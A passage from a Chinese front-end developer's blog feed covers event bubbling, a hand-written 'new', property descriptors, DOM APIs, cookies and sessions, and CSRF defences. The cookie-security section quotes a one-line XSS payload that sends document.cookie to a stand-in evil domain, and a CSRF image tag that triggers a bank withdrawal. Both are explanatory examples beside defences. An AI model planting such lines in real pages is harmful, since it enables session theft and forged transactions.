class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> div = <span class="built_in">document</span>.getElementById(<span class="string">'div'</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> ul = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'ul'</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> li = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'li'</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        div.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">"div"</span>)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        ul.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">"ul"</span>)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        li.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// window.event? window.event.cancelBubble = true : e.stopPropagation();</span></span></span><br><span class="line"><span class="javascript">            alert(<span class="string">"li"</span>)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--点击li时会依次输出li,ul,div，就是事件冒泡--&gt;</span></span><br></pre></td></tr></table></figure><p>阻止冒泡</p><p><strong>w3c的方法是e.stopPropagation()，IE则是使用e.cancelBubble = true</strong> ，兼容性写法如上，只会输出li</p><p>阻止默认事件</p><p><strong>w3c的方法是e.preventDefault()，IE则是使用window.event.returnValue = false;</strong></p><p>javascript的return false只会阻止默认行为 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://caibaojian.com/"</span> <span class="attr">id</span>=<span class="string">"testA"</span> &gt;</span>caibaojian.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">"testA"</span>);</span></span><br><span class="line"><span class="javascript">            a.onclick =<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(e.preventDefault)&#123;</span></span><br><span class="line"><span class="undefined">                    e.preventDefault();</span></span><br><span class="line"><span class="javascript">                &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">window</span>.event.returnValue == <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.27</title>
      <link href="2020/03/27/%E6%97%A5%E5%B8%B8-2020.3.27/"/>
      <url>2020/03/27/%E6%97%A5%E5%B8%B8-2020.3.27/</url>
      
        <content type="html"><![CDATA[<ul><li>手写一下myNew</li><li>数据属性与访问器属性</li></ul><a id="more"></a><h2 id="1-myNew"><a href="#1-myNew" class="headerlink" title="1.myNew"></a>1.myNew</h2><p>简述new一个对象的过程：</p><blockquote><p>创造一个新的空对象<br>新对象的_proto_指向构造函数的原型对象<br>构造函数的this指向正在创建的新对象，并执行构造函数的代码，向新对象中添加属性和方法。<br>返回新对象地址</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">book</span>(<span class="params">name,value</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">this</span>.name = name</span><br><span class="line">          <span class="keyword">this</span>.value = value</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> book1 = <span class="keyword">new</span> book(<span class="string">"abc"</span>,<span class="string">"100"</span>)</span><br><span class="line">      <span class="built_in">console</span>.log(book1)</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">myNew</span>(<span class="params">constructor,...args</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>()</span><br><span class="line">          <span class="keyword">constructor</span>.call(obj,...args)</span><br><span class="line">          obj.__proto__ = <span class="keyword">constructor</span>.prototype</span><br><span class="line">          return obj</span><br><span class="line">      &#125;</span><br><span class="line">      let book2 = myNew(book,"def","200")</span><br><span class="line">      console.log(book2)</span><br><span class="line"></span><br><span class="line">      console.log(book2 instanceof book) //true</span><br></pre></td></tr></table></figure><h2 id="2-数据属性与访问器属性"><a href="#2-数据属性与访问器属性" class="headerlink" title="2. 数据属性与访问器属性"></a>2. 数据属性与访问器属性</h2><p>首先明确，这两个概念是针对数据来定义的。</p><h4 id="数据属性"><a href="#数据属性" class="headerlink" title="数据属性"></a>数据属性</h4><p>数据属性（property）用于实现JavaScript引擎，是属性(property)的内部值，它包含一个数据值的位置。有如下4种行为特性。</p><ul><li>[[Configurable]]：能否被delete删除属性重新定义</li><li>[[Enumerable]]：能否被for-in枚举</li><li>[[Writable]]：能否修改属性值</li><li>[[Value]]：数据的数据值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;&#125;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(person,<span class="string">"name"</span>,&#123;</span><br><span class="line">    writable:<span class="literal">false</span>   <span class="comment">//不可修改属性</span></span><br><span class="line">    value:<span class="string">"abc"</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(person.name) <span class="comment">//abc</span></span><br><span class="line">person.name = bcd</span><br><span class="line"><span class="built_in">console</span>.log(person.name) <span class="comment">//abc</span></span><br></pre></td></tr></table></figure><h4 id="访问器属性"><a href="#访问器属性" class="headerlink" title="访问器属性"></a>访问器属性</h4><p>访问器属性主要由setter和getter函数组成，包含如下4个特性：</p><ul><li>[[Configurable]]：能否被delete删除属性重新定义。默认值：true</li><li>[[Enumerable]]：能否被for-in枚举。默认值：true</li><li>[[Get]]：读取属性值。默认值：undefined</li><li>[[Set]]：写入属性值。默认值：undefined</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> book = &#123;</span><br><span class="line">    _year:<span class="number">2004</span>, <span class="comment">//_year前面的下划线是一种常用的记号，用于表示只能通过对象方法访问的属性。</span></span><br><span class="line">    edition:<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(book,<span class="string">"year"</span>,&#123;</span><br><span class="line">    get:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._year</span><br><span class="line">    &#125;,</span><br><span class="line">    set:<span class="function"><span class="keyword">function</span>(<span class="params">newValue</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(newValue&gt;<span class="number">2004</span>)&#123;</span><br><span class="line">    <span class="keyword">this</span>._year = newValue</span><br><span class="line">    <span class="keyword">this</span>.edition += newValue<span class="number">-2004</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">book.year = <span class="number">2005</span></span><br><span class="line"><span class="built_in">console</span>.log(book.edition)</span><br></pre></td></tr></table></figure><p>其实_year和year是两个属性，_year是数据属性，year是访问器属性，_year为内部使用的，year为外部使用的。</p><p>如果都改为year，调用book.year会报错，因为这句话既可以输出数据属性，也可以调用访问器属性，产生冲突。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.24</title>
      <link href="2020/03/24/%E6%97%A5%E5%B8%B8-2020.3.24/"/>
      <url>2020/03/24/%E6%97%A5%E5%B8%B8-2020.3.24/</url>
      
        <content type="html"><![CDATA[<ul><li>如何给一个页面添加10000个div</li><li>原生js中常用的操作DOM的api接口</li><li>不同源就不能传送cooike了吗</li><li>cooike存在的安全隐患</li><li>CSRF解决办法</li><li>一道处理字符串的代码题</li></ul><a id="more"></a><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-cn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        body div &#123;</span></span><br><span class="line"><span class="undefined">            width: 30px;</span></span><br><span class="line"><span class="undefined">            height: 2px;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#ee3333</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 利用 innerHTML 拼接字符串的方式     (添加10000个div)  (耗时约900ms） 最慢</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// function f() &#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     var date = +new Date();</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     for (var i = 1; i &lt;= 10000; i++) &#123;</span></span></span><br><span class="line"><span class="xml">    //         document.body.innerHTML += "<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>"</span></span><br><span class="line"><span class="javascript">    <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     var date1 = +new Date();</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     console.log(date1-date);</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// f();</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 利用 innerHTML 数组赋值的方式  结构稍微复杂  （添加10000个div)   （耗时约15ms)  最快</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> date = +<span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">10000</span>; i++) &#123;</span></span><br><span class="line"><span class="xml">            str.push('<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>');</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        str = str.join(<span class="string">''</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.innerHTML = str;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> date1 = +<span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(date1 - date);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    f();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 利用 createElement    结构清晰简单          (添加10000个div)   (耗时约20ms) 比最快慢一丢丢</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// function f() &#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     var date = +new Date();</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     for (var i = 1; i &lt;= 10000; i++) &#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//         var div = document.createElement('div');</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//         document.body.appendChild(div);</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     var date1 = +new Date();</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     console.log(date1 - date);</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// f();</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-原生JS操作DOM的API"><a href="#2-原生JS操作DOM的API" class="headerlink" title="2. 原生JS操作DOM的API"></a>2. 原生JS操作DOM的API</h2><h4 id="一-、创建型API总结"><a href="#一-、创建型API总结" class="headerlink" title="一 、创建型API总结"></a>一 、创建型API总结</h4><p>创建型API包括createElement,createTextNode,cloneNode和createDocumentFragment四个方法，需要注意下面几点:<br> (1) 它们创建的节点，只是一个孤立的节点，需要通过appendChild添加到文档中。<br> (2) cloneNode要注意，如果被复制，是否包含子节点以及事件绑定等问题。<br> (3) 使用createDocumentFragment来解决添加大量节点时的性能问题  。</p><hr><h4 id="二、-页面修改型API总结"><a href="#二、-页面修改型API总结" class="headerlink" title="二、 页面修改型API总结"></a>二、 页面修改型API总结</h4><p>修改页面内容的API主要包括：appendChild,removeChild,insertBefore,replaceChild<br> 需要注意几点：<br> (1) 不管是新增还是替换节点，如果新增或者替换的节点原本是存在于页面上的，则其原来位置的节点将被移除，也就是说同一个节点，不能存在于页面上的多个位置。<br> (2) 节点本身绑定的事件不会消失，会一直保留。</p><hr><h4 id="三、-节点查询型API总结"><a href="#三、-节点查询型API总结" class="headerlink" title="三、 节点查询型API总结"></a>三、 节点查询型API总结</h4><p>document.getElementById<br> document.getElementByName<br> document.getElementByTagName<br> document.getElementByClassName<br> document.querySelector和document.querySelectorAll：通过CSS选择器来查找元素，注意选择器要复合CSS选择器的规则。使用深度优先搜索来获取元素。</p><hr><h4 id="四、节点关系型API总结"><a href="#四、节点关系型API总结" class="headerlink" title="四、节点关系型API总结"></a>四、节点关系型API总结</h4><ol><li>父关系型API</li></ol><ul><li>parentNode: Element的父节点可能是Element,Document和DocumentFragment</li><li>parentElement:与parentNode的区别在于，其父节点必须是一个Element，如果不是，则返回null。</li></ul><ol><li>兄弟关系型API</li></ol><ul><li>previousSibling: 节点的前一个节点，如果该节点是第一个节点，则为null.注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下。</li><li>previousElementSibling:返回前一个元素节点，前一个节点必须是Element,注意IE9以下浏览器不支持。</li><li>nextSibling: 节点的后一个节点，如果该节点是最后一个节点，则为null. 注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下。</li><li>nextElementSibling: 返回后一个元素节点，后一个节点必须是Element，注意IE9以下浏览器不支持。</li></ul><ol><li>子关系型API</li></ol><ul><li>childNodes :返回一个即时的nodeList,表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。</li><li>children: 一个即时的HTMLCollection,子节点都是Element，IE9以下浏览器不支持。</li><li>firstNode: 第一个子节点</li><li>lastNode: 最后一个子节点</li><li>hasChildNodes方法：可以用来判断是否包含子节点</li></ul><hr><h4 id="五、元素属性型API"><a href="#五、元素属性型API" class="headerlink" title="五、元素属性型API"></a>五、元素属性型API</h4><p>setAttribute: 根据名称和值修改元素的特性，eg:element.setAttribute(name,value);<br> getAttribute: 返回指定的特性名相应的特性值，如果不存在，则返回null或空字符串。</p><h4 id="六、元素样式型API"><a href="#六、元素样式型API" class="headerlink" title="六、元素样式型API"></a>六、元素样式型API</h4><p>window.getComutedStyle是用来获取应用到元素后的样式，假设某个元素并未设置高度，而是通过其内容将其高度撑开，这时候要获取它的高度，就要用到getComutedStyle，用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var style = window.getComputedStyle(element[, pseudoElt]);</span><br></pre></td></tr></table></figure><p>element是要获取的元素，pseudoElt指定一个伪元素进行匹配。<br> 返回的style是一个CSSStyleDeclaration对象。<br> 通过style可以访问到元素计算后的样式<br> clientRect是一个DOMRect对象，包含left，top，right，bottom，它是相对于可视窗口的距离，滚动位置发生改变时，它们的值是会发生变化的。除了IE9以下浏览器，还包含元素的height和width等数据；</p><h2 id="3-不同源就不能传送cookie了吗"><a href="#3-不同源就不能传送cookie了吗" class="headerlink" title="3. 不同源就不能传送cookie了吗"></a>3. 不同源就不能传送cookie了吗</h2><p>没错，cooike不可以跨域。下图为cookie的原理图</p><p> <img src="https://mmbiz.qpic.cn/mmbiz_png/lbvmSLlcGOicIHvCd7lAde60gAEyrzKkoia1iboy4CibSwZPdJ4vIicaMDfn9DBdicUgPViaKIjgURGqP1brnDVywuwgg/640?wx_fmt=png" alt="1"></p><p>用户在输入用户名和密码之后，浏览器将用户名和密码发送给服务器，服务器进行验证，验证通过之后将用户信息加密后封装成<strong>Cookie放在请求头中返回给浏览器</strong>。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: user_cookie=Rg3vHJZnehYLjVg7qi3bZjzg; Expires=Tue, 15 Aug 2019 21:47:38 GMT; Path=/; Domain=.169it.com; HttpOnly</span><br><span class="line"></span><br><span class="line">[响应体]</span><br><span class="line"></span><br><span class="line">//顶级域名只能设置或访问顶级域名的Cookie，二级及以下的域名只能访问或设置自身或者顶级域名的Cookie</span><br></pre></td></tr></table></figure><p>浏览器收到服务器返回数据，发现请求头中有一个：<strong>Set-Cookie</strong>，然后它就把这个Cookie保存起来，下次浏览器再请求服务器的时候，会把Cookie也放在<strong>请求头</strong>中传给服务器： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: user_cookie=Rg3vHJZnehYLjVg7qi3bZjzg</span><br></pre></td></tr></table></figure><h3 id="什么是Session"><a href="#什么是Session" class="headerlink" title="什么是Session"></a>什么是Session</h3><p>Session工作原理：</p><ol><li>当一个用户向服务器发送第一个请求时，服务器为其建立一个session，并为此session创建一个标识号（sessionID）。</li><li>这个用户随后的所有请求都应包括这个标识号（sessionID）。服务器会校对这个标识号以判断请求属于哪个session。</li></ol><p>对于session标识号（sessionID），有两种方式实现：Cookie和URL重写，猪哥就以Cookie的实现方式画一个Session原理图。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/lbvmSLlcGOicIHvCd7lAde60gAEyrzKkoenficyGn5bX7D5CTWf44q8L0iaicCkYMpe4dCGSibbukrf4uQ52aedRSicw/640?wx_fmt=png" alt="2"></p><h3 id="Cookie和Session关系"><a href="#Cookie和Session关系" class="headerlink" title="Cookie和Session关系"></a>Cookie和Session关系</h3><ol><li>都是为了实现客户端与服务端交互而产出</li><li>Cookie是保存在客户端，缺点易伪造、不安全</li><li>Session是保存在服务端，会消耗服务器资源</li><li>Session实现有两种方式：Cookie和URL重写</li></ol><h3 id="Cookie带来的安全性问题"><a href="#Cookie带来的安全性问题" class="headerlink" title="Cookie带来的安全性问题"></a>Cookie带来的安全性问题</h3><ol><li><strong>会话劫持和XSS</strong>：在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。<code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</code>HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。</li><li><p><strong>跨站请求伪造（CSRF）</strong>：维基百科已经给了一个比较好的CSRF例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<code>&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</code>当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。<strong>解决CSRF的办法有：隐藏域验证码、确认机制、较短的Cookie生命周期等</strong></p><h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3></li></ol><p><strong>（1）验证 HTTP Referer 字段</strong> </p><p> 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。 </p><p>如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值 。</p><p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的 ，目前已经有一些方法可以篡改 Referer 值 。</p><p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 </p><p><strong>（2）在请求地址中添加 token 并验证</strong> </p><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 </p><p>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。 在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的。</p><p><strong>（3）SameSite Cookie</strong></p><p>Set-Cookie 响应头新增 SameSite 属性，它用来标明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。SameSite 有两个属性值，分别是 Strict 和 Lax</p><p> <code>Strict</code>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。 </p><p><code>Lax</code>规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。 </p><h2 id="4-一道处理字符串的代码题"><a href="#4-一道处理字符串的代码题" class="headerlink" title="4. 一道处理字符串的代码题"></a>4. 一道处理字符串的代码题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//美团一道题</span></span><br><span class="line">      <span class="keyword">let</span> str = <span class="string">"x=1&amp;&amp;y=2&amp;&amp;y=3&amp;&amp;z=4&amp;&amp;y=4"</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//输出</span></span><br><span class="line">      <span class="comment">// obj = &#123;</span></span><br><span class="line">      <span class="comment">//     x:1,</span></span><br><span class="line">      <span class="comment">//     y:[2,3],</span></span><br><span class="line">      <span class="comment">//     z:4</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> tmp = str.split(<span class="string">"&amp;&amp;"</span>)</span><br><span class="line">      <span class="keyword">let</span> left = []</span><br><span class="line">      <span class="keyword">let</span> right = []</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> tmp)&#123;</span><br><span class="line">          left.push(tmp[i].split(<span class="string">"="</span>)[<span class="number">0</span>])</span><br><span class="line">          right.push(tmp[i].split(<span class="string">"="</span>)[<span class="number">1</span>])</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">console</span>.log(left,right)</span><br><span class="line">      <span class="keyword">let</span> res = <span class="keyword">new</span> <span class="built_in">Object</span>()</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> left)&#123;</span><br><span class="line">          <span class="keyword">if</span>(res.hasOwnProperty(left[i]))&#123;<span class="comment">//如果包含重复元素</span></span><br><span class="line">              <span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(res[left[i]]))&#123;<span class="comment">//如果已经是数组就直接添加</span></span><br><span class="line">                  res[left[i]].push(right[i])</span><br><span class="line">              &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果不是数组则构造成数组</span></span><br><span class="line">                  <span class="keyword">let</span> tmp = <span class="keyword">new</span> <span 